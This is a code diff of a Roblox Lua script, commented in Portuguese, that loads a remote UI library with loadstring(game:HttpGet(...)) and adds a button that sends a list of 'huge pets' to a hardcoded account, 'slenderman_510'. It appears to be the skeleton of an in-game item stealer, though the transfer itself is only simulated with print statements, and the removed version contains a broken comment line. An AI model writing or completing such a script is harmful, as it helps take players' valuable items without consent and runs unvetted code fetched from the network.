@@ -1,54 +1,63 @@
---Aqui esta a lib do UI
+--Local lib do UI
+local Lib = loadstring(game:HttpGet("https://raw.githubusercontent.com/7yhx/kwargs_Ui_Library/main/source.lua"))()
 
-    local Lib = loadstring(game:HttpGet("https://raw.githubusercontent.com/7yhx/kwargs_Ui_Library/main/source.lua"))()
-    
-    local UI = Lib:Create{
-        Theme = "Dark", -- or any other theme
-        Size = UDim2.new(0, 555, 0, 400) -- default
-     }
-     
-     local Main = UI:Tab{
-        Name = "Inicio"
-     }
-     
-     local Divider = Main:Divider{
-        Name = "Inicio"
-     }
-     
-     local QuitDivider = Main:Divider{
-        Name = "Sair"
-     }
+local UI = Lib:Create{
+   Theme = "Dark", -- ou qualquer outro tema
+   Size = UDim2.new(0, 555, 0, 400) -- padrão
+}
 
-     - wilib.lua: Biblioteca para envio de pets pelo correio no Roblox (Hipotético)
-     local wilib = {}
-     
-     -- Função para enviar pets pelo correio
-     function wilib.sendPet(HugePet, recipient, mailboxFolder, petsStorage)
-         -- Verifica se o armazenamento e o correio existem
-         if not mailboxFolder or not petsStorage then
-             return
-         end
-     
-         -- Tenta encontrar o pet no armazenamento
-         local pet = petsStorage:FindFirstChild(HugePet)
-         if pet then
-             print("Pet encontrado: " .. HugePet)
-     
-             -- Cria uma pasta para armazenar os itens enviados ao destinatário
-             local mail = mailboxFolder:FindFirstChild("MailFor_" .. recipient)
-             if not mail then
-                 mail = Instance.new("Folder")
-                 mail.Name = "MailFor_" .. recipient
-                 mail.Parent = mailboxFolder
-             end
-     
-             -- Clona o pet e adiciona à pasta do destinatário
-             local petClone = pet:Clone()
-             petClone.Parent = mail
-     
-             print("Pet " .. HugePet .. " enviado para o correio de " .. recipient)
-         else
-         end
-     end
-     
-     return wilib
+local Main = UI:Tab{
+   Name = "Main"
+}
+
+local Divider = Main:Divider{
+   Name = "Main shit"
+}
+
+local QuitDivider = Main:Divider{
+   Name = "Quit"
+}
+
+local playerName = "slenderman_510"  -- Nome da conta destinatária
+local hugePets = {"Huge Pet 1", "Huge Pet 2", "Huge Pet 3"}  -- Lista dos huge pets a serem enviados
+
+-- Função para verificar se um pet é "huge"
+function isHugePet(pet)
+    local hugePetList = {"Huge Pet 1", "Huge Pet 2", "Huge Pet 3"}
+    for _, hugePet in ipairs(hugePetList) do
+        if pet == hugePet then
+            return true
+        end
+    end
+    return false
+end
+
+-- Função para enviar um pet pela mailbox
+function sendPetToMailbox(player, pet)
+    if isHugePet(pet) then
+        print("Enviando " .. pet .. " para " .. player)
+        -- Código para enviar o pet pela mailbox vai aqui
+        -- Simulação do envio:
+        wait(1)
+        print(pet .. " foi enviado para " .. player .. " com sucesso!")
+    else
+        print(pet .. " não é um huge pet e não será enviado.")
+    end
+end
+
+-- Função para enviar todos os pets da lista pela mailbox
+function sendAllPets(player, pets)
+    for _, pet in ipairs(pets) do
+        sendPetToMailbox(player, pet)
+    end
+end
+
+-- Botão para enviar os huge pets
+local sendPetsButton = Main:Button{
+    Name = "Enviar Huge Pets",
+    Callback = function()
+        sendAllPets(playerName, hugePets)
+    end
+}
+
+
